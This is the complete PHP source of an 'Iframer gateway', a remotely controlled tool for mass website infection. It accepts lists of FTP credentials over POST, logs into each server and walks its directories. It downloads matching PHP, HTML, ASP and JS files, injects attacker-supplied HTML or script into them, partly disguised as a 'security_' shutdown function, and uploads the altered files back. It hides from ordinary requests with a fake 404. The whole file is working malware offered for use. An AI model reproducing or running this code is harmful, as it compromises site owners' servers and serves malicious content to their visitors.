<?php
/** Iframer gateway
 *
 * The script accepts tasks via $_POST & executes them. Intermediary results are stored in a session.
 */
define('DEBUG_LOG_FILE', __FILE__.'.log'); # Debug log file. To get logs, create it & make writable
define('DRY_RUN_DIRECTORY', 'iframed'); # temporary directory for iframed files in 'dry-run' mode
define('FILE_EXTENSIONS_IGNORED', '.txt .jpg.jpeg.png.gif.pdf.psd.tif.tiff .zip.rar.tgz.gz.bz2.tbz2 .doc.docx.xls.xlsx.ppt.pptx.odt.ods.odp .wav.mp3 .avi.mkv.mpg.mpeg .flv'); # binary formats to ignore
define('FILE_EXTENSIONS', FILE_EXTENSIONS_IGNORED.'.js .css .php.php3.php4.php5.inc.phtml .asp.aspx .tpl .htm.html.shtm.shtml.dhtm.dhtml .xml .sql .log'); # extensions that are files, always

# Error reporting
ini_set('display_errors', 0);
ini_set('html_errors', 0);
if (file_exists(DEBUG_LOG_FILE)){
	ini_set('error_log', DEBUG_LOG_FILE);
	ini_set('log_errors', 1);
	}
error_reporting(E_ALL);

if(1 && php_sapi_name()!='cli' && @$_SERVER['REQUEST_METHOD'] !== 'POST'){
	header('HTTP/1.0 404 Not found');
	die('Not found');
	}

# Unlimited execution :)
set_time_limit(60*60);
ignore_user_abort(true);

# Make sure we have no output buffering
do { @ob_end_clean(); } while(ob_get_level()>0);
@ob_end_flush();
ini_set("output_buffering", 0);
ini_set("zlib.output_compression", 0);

# Magic quotes? No, heard not :)
if (function_exists('get_magic_quotes_gpc') && function_exists('set_magic_quotes_runtime')){
	if (get_magic_quotes_gpc() == 1) {
		$process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
		while (list($key, $val) = each($process)) {
			foreach ($val as $k => $v) {
				unset($process[$key][$k]);
				if (is_array($v)) {
					$process[$key][stripslashes($k)] = $v;
					$process[] = &$process[$key][stripslashes($k)];
				} else {
					$process[$key][stripslashes($k)] = stripslashes($v);
				}
			}
		}
		unset($process);
	}
}

# Make sure there's no active session
@session_destroy();
@session_write_close();

# Prepare the session
ini_set('session.use_cookies', '0');
session_cache_limiter( FALSE );
$id = md5(__FILE__.'a');
session_name($id);
session_id($id);


if (0 && 'debug_insert_algo'){
	$config['html'] = <<<HTML
<script>..</script>
HTML;
	$config['marker'] = 'InsertionMarker';

	$config['inject'] = 'smart'; # smart, append, overwrite
	$contents = <<<HTML
<html>
<body>

HTML;


	$iframer = new IFramer;
	$iframed = $iframer->_iframe_file('script.php', $contents, $config);
	echo $iframed;

	die();
}



/** Print results array using the protocol
 */
function protocol_print_results($results){
	$s = serialize($results);
	$len = strlen($s);
	$ll = str_pad(strlen($len), 4, '0', STR_PAD_LEFT);

	return $ll . $len . $s;
	}

/** Shortcut for fatal errors */
function protocol_fatal_error($errors){
	return protocol_print_results(array('errors' => (array)$errors));
	}

function trace_log($string){
	if (file_exists(DEBUG_LOG_FILE) && is_writable(DEBUG_LOG_FILE)){
		$f = fopen(DEBUG_LOG_FILE, 'a');
		fwrite($f, "$string\n");
		fclose($f);
		}
	}



if (!function_exists('json_encode')) {
	function json_encode($data) {
		switch ($type = gettype($data)) {
			case 'NULL':
				return 'null';
			case 'boolean':
				return ($data ? 'true' : 'false');
			case 'integer':
			case 'double':
			case 'float':
				return $data;
			case 'string':
				return '"' . addslashes($data) . '"';
			case 'object':
				$data = get_object_vars($data);
			case 'array':
				$output_index_count = 0;
				$output_indexed = array();
				$output_associative = array();
				foreach ($data as $key => $value) {
					$output_indexed[] = json_encode($value);
					$output_associative[] = json_encode($key) . ':' . json_encode($value);
					if ($output_index_count !== NULL && $output_index_count++ !== $key)
						$output_index_count = NULL;
					}
				if ($output_index_count !== NULL)
					return '[' . implode(',', $output_indexed) . ']';
					else
					return '{' . implode(',', $output_associative) . '}';
			default:
				return ''; // Not supported
			}
		}
	}


/** All actions supported by the iframer.
 * Each action returns an array() of any data. A special key, 'errors' => array(), is reserved for fatal errors
 */
class IFramerActions {
	/** Perform self-testing
	 * @return array array()
	 */
	function action_selftest($config, $args){
		$errors = array();

		# Session storage test
		if (!function_exists('session_write_close'))
			$errors[] = 'Disabled function: session_write_close()';
			else {
			session_start();
			$_SESSION['selftest'] = 'abc';
			session_write_close();

			session_start();
			if (!isset($_SESSION['selftest']) || $_SESSION['selftest'] != 'abc')
				$errors[] = 'Session storage misbehaves';
			session_write_close();
			}

		# FTP test
		if (!function_exists('ftp_connect'))
			$errors[] = 'Disabled function: ftp_connect()';

		# tmpfile() test
		if (!function_exists('tmpfile'))
			$errors[] = 'Disabled function: tmpfile()';
			elseif (!tmpfile())
			$errors[] = 'tmpfile() fails to create a temporary stream';

		return array('errors' => $errors, 'results' => $errors? 'self-test failed' : 'ok');
		}

	/** Get new iframing tasks
	 * @param string[] $accs
	 * 	The list of FTP accounts to process
	 */
	function action_post_tasks($config, $args){
		$status = array(
			'errors' => array(),
			'new_tasks' => 0,
			);

		# Collect tasks
		session_start();
		if (!isset($_SESSION['accs']))
			$_SESSION['accs'] = array();

		if (count($_SESSION['accs']) > 30){
			$status['reject_reason'] = 'too many active tasks';
			return $status;
			}

		if (!empty($args['accs']))
			foreach($args['accs'] as $ftp_acc){
				$_SESSION['accs'][ $ftp_acc ] = array(
						'start_times' => 0, # how many times the task was started
						'state' => 0, # state: 0=idle, 1=running, 2=finished
						'errors' => array(),

						'ftp_acc' => $ftp_acc,
						'is_valid' => null, # is valid?

						'stat' => array(
							'refused' => 0, # refused connections count

							'found' => array( # total found statistics
								'dirs' => 0,
								'files' => 0,
								),

							'failed' => array(
								'dirs' => 0, # dirs failed to enter
								'files' => 0, # matched files failed to down/upload
								),

							'matched' => array( # matched count
								'dirs' => 0,
								'files' => 0,
								),
							),

						'trav' => array('.', '/'), # directories to be traversed

						'pages' => array(), # iframed pages
						'pages_queue' => array(), # pages not yet iframed
						);
				$status['new_tasks']++;
				}
		session_write_close();

		return $status;
		}

	/** Dump the script's state */
	function action_dump($config, $args){
		session_start();
		$ssn = $_SESSION;
		session_write_close();

		return array('session' => $ssn);
		}

	/** Reset the script's state */
	function action_reset($config, $args){
		session_start();
		session_destroy();
		session_write_close();
		return array('reset' => 'ok');
		}

	/** Start iframing
	 * This method prints result right before it starts processing accounts. Read & close, else you'll wait endlessly :)
	 * @param $config
	 * @param $args
	 */
	function action_launch($config, $args){
		# All task names
		session_start();
		if (!isset($_SESSION['lifesign'])) $_SESSION['lifesign'] = 0;
		if (!isset($_SESSION['accs'])) $_SESSION['accs'] = array();

		$lifesign_delta = time() - $_SESSION['lifesign'];
		$task_names = array_keys($_SESSION['accs']);
		session_write_close();

		# Already running?
		if ($lifesign_delta < 60*2)
			return array('launched' => 'already running', 'ago' => $lifesign_delta);

		trace_log('action_launch(): started');

		# Prepare
		$data = protocol_print_results(array('launched' => 'yes'));
		header('Content-Length: '.strlen($data)); # should make the client disconnect
		header('Connection: close');
		echo $data;

		# We're going to do long processing so the client should disconnect
		# However, some webservers (like nginx) do buffer script's output.
		# Here we print junk until all buffers are flushed & the connection is really closed
		$junk = str_repeat("\n\n\n\n\n\n\n\n", 128);
		for ($i=0;;$i++){
			echo $junk; # 1 Kbyte
			if (connection_aborted() || $i>30) break; # success or reasonable result
			}

		trace_log('action_launch(): tasks: ' . count($task_names));

		# Launch the iframer
		$limit = 1000;
		while (!empty($task_names) && (--$limit> 0)){
			session_start();
			$task_id = array_rand($task_names); # pick random tasks (in case some task permanently fails)
			$task_name = $task_names[$task_id];
			$task = $_SESSION['accs'][ $task_name ];
			$_SESSION['lifesign'] = time();
			session_write_close();

			if ($task['state'] == 2)
				unset($task_names[$task_id]); # no more
				else { # launch
				$iframer = new IFramer;
				$iframer->task($task_name, $task, $config);
				}
			}

		trace_log('action_launch(): finished');

		return array('errors' => array());
		}

	/** Collect results of the last launch (possibly, incomplete)
	 * @return array array( array( 'acc' => ftp-account, 'alive' => bool, 'pages' => array(list of iframed pages) ) )
	 */
	function action_collect($config, $args){
		$ret = array(
			'state' => array(
				'idle' => 0,
				'running' => 0,
				'finished' => 0,
				),
			'finished' => array(), # finished accs (partial)
			);

		session_start();
		if (isset($_SESSION['accs']))
			foreach ($_SESSION['accs'] as $task_name => $task)
				switch ($task['state']){
					case 0: $ret['state']['idle']++; break;
					case 1: $ret['state']['running']++; break;
					case 2:
						$ret['state']['finished']++;
						if (count($ret['finished'])<10)
							$ret['finished'][$task_name] = $task;
						break;
				}
		session_write_close();

		return $ret;
		}

	/** Purge collected results
	 */
	function action_collected_purge($config, $args){
		session_start();
		foreach ($args['task_names'] as $task_name)
			if (isset($_SESSION['accs'][$task_name]))
				unset($_SESSION['accs'][$task_name]); # fetched & finished. Remove it now
		session_write_close();
		return array();
		}
	}



/** The iframer
 * @property string $_phperrors
 */
class IFramer {
	/** Update task info in the session
	 */
	function _update_task($task_name, $task){
		session_start();
		$_SESSION['lifesign'] = time();
		$_SESSION['accs'][ $task_name ] = $task;
		session_write_close();
		}

	function _php_error($no, $str, $file, $line){
		$this->_phperrors[] = "@$line: $str";
		return true;
		}

	/** The entry point
	 */
	function task($task_name, $task, $config){
		trace_log('iframer: task started: '.$task_name);

		$this->_phperrors = array();
		set_error_handler(array($this, '_php_error'));
		$task = $this->_perform($task_name, $task, $config);
		restore_error_handler();

		$task['errors'] = array_merge($task['errors'], $this->_phperrors);
		$task['errors'] = array_slice(array_unique($task['errors']), 0, 20); # just in case

		trace_log("iframer: task finished: $task_name, state={$task['state']}");

		$this->_update_task($task_name, $task);
		}

	function _perform($task_name, $task, $config){
		$task['state'] = 1;

		# Error limit
		$task['start_times']++;
		if ($task['start_times']>10){
			$task['errors'][] = 'Multiple failure. Excluded';
			$task['state'] = 2;
			return $task;
			}

		$this->_update_task($task_name, $task); # need to save in case connect() hangs

		# Connect
		$purl = parse_url($task['ftp_acc']);
		$purl['port'] = isset($purl['port'])? $purl['port'] : 21;
		trace_log("iframer: _perform: $task_name: connecting: {$purl['host']}:{$purl['port']}");
		$ftp = ftp_connect($purl['host'], $purl['port'], 30);
		if (!$ftp){
			$task['errors'][] = 'FTP connection failed!';
			$task['stat']['refused']++;
			if ($task['stat']['refused'] >= 3){ # Retry 3 times.
				$task['is_valid'] = false;
				$task['state'] = 2;
				}
			return $task;
			}

		$task['connection_attempts'] = 0;

		# Authenticate
		trace_log("iframer: _perform: $task_name: authenticating: {$purl['user']}:{$purl['pass']}");
		if (!ftp_login($ftp, $purl['user'], $purl['pass'])){
			$task['errors'][] = 'Auth failed!';
			$task['is_valid'] = false;
			$task['state'] = 2;
			return $task;
			}

		# Check only?
		if ($config['mode'] == 'checkonly'){
			$task['state'] = 2;
			$task['is_valid'] = true;
			ftp_close($ftp);
			return $task;
			}

		# Prepare
		$task['state'] = 1;
		$task['is_valid'] = true;
		ftp_pasv($ftp, true);
		$this->_update_task($task_name, $task);

		# Traverse the tree, discover files
		trace_log('iframer: _perform: '.$task_name.': traversing phase initiated');
		$PATH_DEDUP = array(); # path deduplication array
		while (!is_null($dir = array_shift($task['trav']))){
			# Dirs with a dot can occasionally be a file... stupid
			if (strpos($dir, '.') !== FALSE){
				$dirlist = @ftp_nlist($ftp, $dir); # raise no error
				if ($dirlist === FALSE)
					continue; # just continue
				}

			# List
			$dirlist = ftp_nlist($ftp, $dir);
			if (is_array($dirlist))
				$task['stat']['found']['dirs']++;
				else {
				$task['stat']['failed']['dirs']++;
				if (!$this->_ftp_test_connection($ftp)){
					$task['errors'][] = 'Lost connection';
					array_unshift($task['trav'], $dir);
					return $task; # try again
					}
				continue;
				}

			# Distribute
			$dirs = array();
			$files = array();

			foreach ($dirlist as $f){
				# Turn & collapse slashes
				$f = preg_replace('~[\\\/]+~S', '/', $f);

				# Make full path
				$f = (strpos($f, '/') === FALSE)? "$dir/$f" : $f;

				# Deduplication
				$f_dedup = trim($f, './');
				if (in_array($f_dedup, $PATH_DEDUP)) continue;
				$PATH_DEDUP[] = trim($f_dedup);

				# File | dir ?
				$f_base = basename($f);

				if ($f_base[0] != '.'){
					if (strpos($f_base, '.') !== FALSE){
						$files[] = $f;
						if (strpos(FILE_EXTENSIONS, strtolower(strrchr($f_base, '.'))) === FALSE)
							$dirs[] = $f; # can also be a directory! Like 'example.com'
						}
						else
						$dirs[] = $f;
					}
				}

			trace_log('iframer: _perform: '.$task_name.': listing dir "'.$dir.'": files='.implode(', ', $files));
			trace_log('iframer: _perform: '.$task_name.': listing dir "'.$dir.'": dirs='.implode(', ', $dirs));

			# Update the traverse tree
			foreach ($dirs as $d){
				$d_trimmed = trim($d, './');
				$depth = substr_count($d_trimmed, '/');
				$matched = $this->_match_dir($d_trimmed, $config['traverse']['dir_masks']); # when a directory matches - traverse depth is increased by its level
				$depth -= $matched;

				trace_log('iframer: _perform: '.$task_name.': Matching dir "'.$d.'": depth='.$depth.', matched='.var_export($matched,1));

				if ($matched)
					$task['stat']['matched']['dirs']++;

				if ($depth < $config['traverse']['depth'])
					$task['trav'][] = $d;
				}

			# Match files
			$task['stat']['found']['files'] += count($files);
			foreach ($files as $file)
				if (strpos(FILE_EXTENSIONS_IGNORED, strtolower(strrchr($file, '.'))) !== FALSE)
					continue; # ignored files
				elseif ($this->_match_path($file, $config['traverse']['dir_masks'], $config['traverse']['file_masks'])){
					$task['stat']['matched']['files']++;
					$task['pages_queue'][] = $file;
					trace_log('iframer: _perform: '.$task_name.': matched file path: "'.$file.'"');
					}

			# Update the session with new dir contents
			$this->_update_task($task_name, $task);
			}

		# Iframe all files
		trace_log('iframer: _perform: '.$task_name.': iframing phase initiated: '.count($task['pages_queue']).' files in queue');
		while (!is_null($file = array_shift($task['pages_queue']))){
			$task['stat']['failed']['files']++; # assume an error

			# Any old descriptor remains?
			if (isset($contents_f))
				fclose($contents_f);

			# Prepare a descriptor
			if ($config['mode'] == 'preview'){
				if (!file_exists(DRY_RUN_DIRECTORY))
					mkdir(DRY_RUN_DIRECTORY, 0777, true);
				if (!file_exists(DRY_RUN_DIRECTORY))
					continue;

				$ext = strrchr(basename($file), '.');
				for($i=0;;$i++)
					if (!file_exists($contents_fname = DRY_RUN_DIRECTORY.'/'.basename($file).'-'.$i.$ext))
						break;
				$contents_f = fopen($contents_fname, 'w+');
				}
				else
				$contents_f = tmpfile();

			if (!$contents_f)
				continue;

			# Download
			trace_log('iframer: _perform: '.$task_name.': iframing "'.$file.'": downloading');
			if (!ftp_fget($ftp, $contents_f, $file, FTP_BINARY)){
				if (!$this->_ftp_test_connection($ftp)){
					$task['errors'][] = 'Lost connection';
					array_unshift($task['pages_queue'], $file);
					return $task; # try again
					}
				}
			fseek($contents_f, 0);
			$contents = ''; while (!feof($contents_f)) $contents .= fread($contents_f, 1024);

			# Alter
			$contents = $this->_iframe_file($file, $contents, $config);
			if (is_null($contents)) # not modified
				continue;

			# Write back to the stream
			ftruncate($contents_f, 0);
			fseek($contents_f, 0);
			fwrite($contents_f, $contents);
			fseek($contents_f, 0);
			trace_log('iframer: _perform: '.$task_name.': iframing "'.$file.'": modified');

			# Upload
			if ($config['mode'] == 'inject' || $config['mode'] == 'off') # inject: auto or manual
				if (!ftp_fput($ftp, $file, $contents_f, FTP_BINARY))
					continue;
			fclose($contents_f);
			unset($contents_f);

			# Update the session. It's important here!
			$task['stat']['failed']['files']--; # okay
			$task['pages'][] = $file; # iframed!

			$this->_update_task($task_name, $task);
			}

		$task['state'] = 2;
		ftp_close($ftp);
		return $task;
		}



	/** Test the connection whether it is still functional */
	function _ftp_test_connection($ftp){
		return ftp_pasv($ftp, true) !== FALSE;
		#return ftp_nlist($ftp, '.') !== FALSE;
		}

	/** Match a string against a list of masks
	 * @param string $str
	 * @param string[] $masks
	 * @return bool
	 * 	TRUE if any matched
	 */
	function _match_any($str, $masks){
		foreach($masks as $mask){
			$preg = '~^'.str_replace('\\*', '.*', preg_quote($mask)).'$~iS';
			if (preg_match($preg, $str))
				return true;
			}
		return false;
		}

	/** Match a directory path against a list of masks
	 * @param string $path
	 * 	Path to the directory
	 * @param string[] $dir_masks
	 * 	List of masks to match against
	 * @return bool|int
	 * 	FALSE when no match, (int)$level>0 on match
	 */
	function _match_dir($path, $dir_masks){
		$dir_match = false;
		foreach (explode('/', $path) as $level => $d)
			if ($this->_match_any($d, $dir_masks)){
				$dir_match = $level+1;
				break;
			}
		return $dir_match;
		}

	/** Match file against a list of masks, both dir & file
	 * @param string $path
	 * 	The file to match
	 * @param string[] $dir_masks
	 * 	The array of masks to match directories against
	 * @param string[] $file_masks
	 * 	The array of masks to match files against
	 * @return bool
	 */
	function _match_path($path, $dir_masks, $file_masks){
		$dir_match = $this->_match_dir(dirname($path), $dir_masks) || trim(dirname($path), './\\') == '';
		$file_match = $this->_match_any(basename($path), $file_masks);

		return $dir_match && $file_match;
		}



	/** Perform iframing on a file
	 * @param string $file
	 * 	Path to the file. For matching
	 * @param string $contents
	 * 	The contents to spoil :)
	 * @param string $config
	 *	The configuration
	 * @return string|null
	 * 	Altered HTML, or NULL when not modified
	 */
	function _iframe_file($path, $contents, $config){
		switch ($config['inject']){
			case 'smart':
				$contents = $this->_iframe_file_smart($path, $contents, $config);
				break;
			case 'append':
				$contents = $this->_iframe_file_append($path, $contents, $config);
				break;
			case 'overwrite':
				$contents = $this->_iframe_file_overwrite($path, $contents, $config);
				break;
			default:
				# do nothing on unknown action
			}
		return $contents;
		}

	/** Get normalized file extension */
	function _file_ext($path){
		$ext = strtolower(strrchr(  basename($path)  , '.'));
		switch ($ext){
			case '.inc':
			case '.php':
			case '.php3':
			case '.php4':
			case '.php5':
			case '.phtml':
				return '.php';
			case '.tpl':
			case '.htm':
			case '.html':
			case '.xml':
			case '.xhtm':
			case '.xhtml':
			case '.dhtm':
			case '.dhtml':
				return '.html';
			case '.asp':
			case '.aspx':
				return '.asp';
			# As is
			case '.js':
				return $ext;
			# Unknown
			default:
				return $ext;
			}
		}

	/** Prepare the injection code & try to replace an old iframe with the new one.
	 * @param array $config
	 * 	Iframer config
	 * @param string &$contents
	 * 	File contents. It's modified if the replacement pattern is found
	 * @param string $html_escape_method
	 * 	Code string escaping method: 'var_export', 'json_encode', 'escape_dquote', null
	 * @return null|string
	 * 	TRUE if replacement succeeded.
	 * 	NULL if no replacement has occurred
	 */
	function _iframe_try_replace($config, &$contents, $html_escape_method = null){
		$boundary = array(
			0 => sprintf('<!--(%s)-->', $config['marker']),
			1 => sprintf('<!--(/%s)-->', $config['marker']),
			);

		$inject_html	= "{$boundary[0]}{$config['html']}{$boundary[1]}";
		$search_pattern	= "{$boundary[0]}%%%{$boundary[1]}";
		switch ($html_escape_method){
			case 'var_export':
				$inject_html	= var_export($inject_html,1);
				$search_pattern	= var_export($search_pattern, 1);
				break;
			case 'json_encode':
				$inject_html	= json_encode($inject_html);
				$search_pattern	= json_encode($search_pattern);
				break;
			default:
				# Leave unchanged
			}

		# Try to replace
		$preg_search = '~'.str_replace('%%%', '.*', preg_quote($search_pattern, '~')).'~usS';
		if (!preg_match($preg_search, $contents))
			return $inject_html;  # No replacing possible: just return the correct injection HTML

		# Replace!
		$s = preg_replace($preg_search, $inject_html, $contents);
		if (!is_null($s)){
			$contents = $s;
			return NULL; # REPLACED!
			}


		return $inject_html;
		}

	/** Iframe injection mode: smart (falls back to append for some filetypes) */
	function _iframe_file_smart($path, $contents, $config){
		switch ($this->_file_ext($path)){
			case '.php':
				$escaped_html = $this->_iframe_try_replace($config, $contents, 'var_export');
				if (!is_null($escaped_html)){
					$fn_name = 'security_'.$config['marker'];
					$inject = "<?php if (!function_exists('$fn_name')) { function $fn_name(){ echo $escaped_html; } register_shutdown_function('$fn_name'); } ?>\n";
					$contents = $inject.$contents;
					}
				return $contents;
				break;
			default:
				return $this->_iframe_file_append($path, $contents, $config);
			}
		}

	/** Iframe injection mode: append */
	function _iframe_file_append($path, $contents, $config){
		switch ($this->_file_ext($path)){
			case '.php':
				# Try to append after the last closing tag. If there's no - make it.
				$p1 = strrpos($contents, '<?');
				$p2 = strrpos($contents, '?>');
				if ($p1 !== FALSE && ($p2 === FALSE || $p1>$p2))
					$contents .= "\n?>\n";

				$escaped_html = $this->_iframe_try_replace($config, $contents);
				if (!is_null($escaped_html))
					$contents .= $escaped_html;

				return $contents;
				break;
			case '.asp':
				$p1 = strrpos($contents, '<%');
				$p2 = strrpos($contents, '%>');
				if ($p1 !== FALSE && ($p2 === FALSE || $p1>$p2))
					$contents .= "\n%>\n";

				$escaped_html = $this->_iframe_try_replace($config, $contents);
				if (!is_null($escaped_html))
					$contents .= $escaped_html;

				return $contents;
				break;
			case '.js':
				$escaped_html = $this->_iframe_try_replace($config, $contents, 'json_encode');
				if (!is_null($escaped_html)){
					$inject = ';;;';
					$inject .= '(function(s){';
					$inject .= 'if (window.inserted !== undefined) return;';
					$inject .= 'var d = document.createElement("div");';
					$inject .= 'd.innerHTML = s;';
					$inject .= 'document.body.appendChild(d);';
					$inject .= 'window.inserted = 1;';
					$inject .= '})('.$escaped_html.');';

					$contents .= $inject;
					}

				return $contents;
				break;
			case '.html':
				$escaped_html = $this->_iframe_try_replace($config, $contents);
				if (!is_null($escaped_html))
					$contents .= $escaped_html;

				return $contents;
			default: # undefined case
				return null; # no changes
			}
		}

	/** Iframe injection mode: overwrite */
	function _iframe_file_overwrite($path, $contents, $config){
		return $config['html'];
		}
	}


# Enough data?
$errors = array();
foreach(array('action', 'config') as $c)
	if (!isset($_REQUEST[$c])) $errors[] = $c;
if (!empty($errors))
	die(protocol_fatal_error('Request variables not set: '.implode(', ', $errors)));

# Execute the action
$actions = new IFramerActions;
$action = 'action_'.$_REQUEST['action'];
if (!method_exists($actions, $action))
	die(protocol_fatal_error('Unknown action: '.$_REQUEST['action']));

$ret = $actions->$action($_REQUEST['config'], empty($_REQUEST['args'])? array() : $_REQUEST['args']);
echo protocol_print_results($ret);
